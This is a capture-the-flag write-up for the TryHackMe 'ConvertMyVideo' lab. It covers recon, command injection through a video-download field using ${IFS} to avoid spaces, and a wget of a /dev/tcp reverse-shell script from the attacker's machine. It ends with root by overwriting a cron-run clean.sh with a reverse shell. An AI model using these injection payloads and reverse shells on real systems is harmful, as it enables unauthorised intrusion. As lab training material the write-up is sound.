# TryHackMe - ConvertMyVideo - Linux

- [Room](https://tryhackme.com/room/convertmyvideo)

## Nmap

```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-07-05 21:48 BST
Stats: 0:20:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 22:09 (0:00:00 remaining)
Nmap scan report for ip-10-10-68-80.eu-west-1.compute.internal (10.10.68.80)
Host is up (0.00047s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 02:61:5C:CF:D0:3B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=7/5%OT=22%CT=1%CU=34666%PV=Y%DS=1%DC=D%G=Y%M=02615C%TM
OS:=62C4A916%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M230
OS:1ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)W
OS:IN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F
OS:507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1381.76 seconds
```

## Port 80

- We have a page with a file upload functionality to convert a video  
![image](https://user-images.githubusercontent.com/96747355/177418155-b8a3bc88-c5ac-4aaf-b492-462d01e2611a.png)  

### Gobuster

```
┌──(root💀kali)-[/home/kali/Documents]
└─# gobuster dir -u http://10.10.158.186/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt                                                                                                            1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.158.186/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/06 17:18:46 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.158.186/images/]
/admin                (Status: 401) [Size: 460]                                   
/js                   (Status: 301) [Size: 311] [--> http://10.10.158.186/js/]    
/tmp                  (Status: 301) [Size: 312] [--> http://10.10.158.186/tmp/]
```

### Apache version

- Apache httpd 2.4.29 - CVE-2021-41773
- https://github.com/iilegacyyii/PoC-CVE-2021-41773
- Not going anywhere with this

### The dl functionality

- If we use a real youtube video ID it does not work. We get an error message  
![image](https://user-images.githubusercontent.com/96747355/179367362-35353a69-8c96-4bae-a26c-e7b655113ac0.png)  
- First I inspected on burp the request. Sent it to my repeater and played with it a little
- I tried to inject a command after the url, and got interesting info  
![image](https://user-images.githubusercontent.com/96747355/179367603-133a65f4-6f39-4b40-bec0-c4e2f9aa2d48.png)
- Here are the interesting elements of the response
```
Unable to download webpage: HTTP Error 401: Unauthorized (caused by HTTPError()); please report this issue on https:\/\/yt-dl.org\/bug . Make sure you are using the latest version; type  youtube-dl -U  to update. Be sure to call youtube-dl with the --verbose flag and include its complete output
"result_url":"\/tmp\/downloads\/62d2fd72c199c.mp3
```
- According to this it is using a binary called `youtube-dl` and put the converted video to a downloads folder in /tmp
- We can check [youtube-dl documentation](https://github.com/ytdl-org/youtube-dl/blob/master/README.md#readme) for more info
- We definitely can push further our cmd injection investigation. We can try using backquotes, and it works  
![image](https://user-images.githubusercontent.com/96747355/179368334-757d68ed-afe0-4f76-9038-662702fcce18.png)
- If I want to do more than just a command without args it is getting tricky because of the space, and url encoding does not work. But if you google linux command without space you find [this post on stackoverflow](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces), turns out you can replace a space with `${IFS}` which is a var that contains a space! It works if we do `ls${IFS}admin` but not if we do `ls${IFS}-al` it seems to interpret our `-`  
![image](https://user-images.githubusercontent.com/96747355/179368991-1cad2673-557d-42fb-b2c7-52b66744a85d.png)  
- We can still get our user flag this way though, as we saw it listed with the previous command that worked `cat${IFS}admin/flag.txt`
- Let's try to get a reverse shell all the one liners with reverse have dash sign in them. let's see if we can wget a homemade file with a oneliner shell in it and execute it afterwards.
- We make a file called `oneliner.sh` and put this in it  
```
bash -i >& /dev/tcp/ATTACKING-MACHINE-IP/4444 0>&1
```
- Replace the script with your IP
- And we laucnh our python http server in the folder where our shell is
- So now let's try to first wget our file `wget${IFS}http://10.13.22.56/oneliner.sh` we can already set up our listener so that we do not forget about it `rlwrap nc -lvp 4444` our wget seems to work  
![image](https://user-images.githubusercontent.com/96747355/179369747-fc5aa394-5be0-403e-9def-fca82f1061b1.png)  
![image](https://user-images.githubusercontent.com/96747355/179370010-f6101492-35a8-4478-9b30-a47dc76c6654.png)  
- Let's try to execute it but before we need to make it executable `bash${IFS}oneliner.sh` our chmod with +x does not work let's try with 777 `chmod${IFS}777${IFS}oneliner.sh` and it works  
![image](https://user-images.githubusercontent.com/96747355/179371010-6276b6b1-3906-4cb8-8e60-a59d0855c8a5.png)  
- let's stabilize our shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- If we look around a little we are able to answer question 2 with a cat on .htpasswd
![image](https://user-images.githubusercontent.com/96747355/179373337-e007fd4e-12fe-46ea-af82-b462e5d01992.png)  
- Let's try to overwrite clean.sh

## Privesc

- If we execute linpeas on the target we see that cron is running as root.
- Let's get [pspy](https://github.com/DominicBreuker/pspy) in our target and execute it
- It seems like there is a clean.sh file that is executed through a probable cron job  
![image](https://user-images.githubusercontent.com/96747355/179373393-d1a39c41-3c0f-4abc-b642-1b0842fb04d8.png)
```
bash /var/www/html/tmp/clean.sh 
/bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
/usr/sbin/CRON -f
```
- The clean is just an `rm -rf downloads`
- Let's launch a listener `rlwrap nc -lvp 5555`
- `echo "bash -i >& /dev/tcp/10.13.22.56/5555 0>&1" > /var/www/html/tmp/clean.sh`
- And we get a root shell and we can get our flag  
![image](https://user-images.githubusercontent.com/96747355/179373526-68409f61-a3a5-4f1c-a1f9-61f8bc72cb1f.png)  

## Questions

- What is the name of the secret folder? `admin` (we get this using gobuster, see above)
- What is the user to access the secret folder? to know this we need to do this one we have our reverse shell `cat admin/.htpasswd` we will get the user and password inside this file.
- I let you find the flags on your own :)
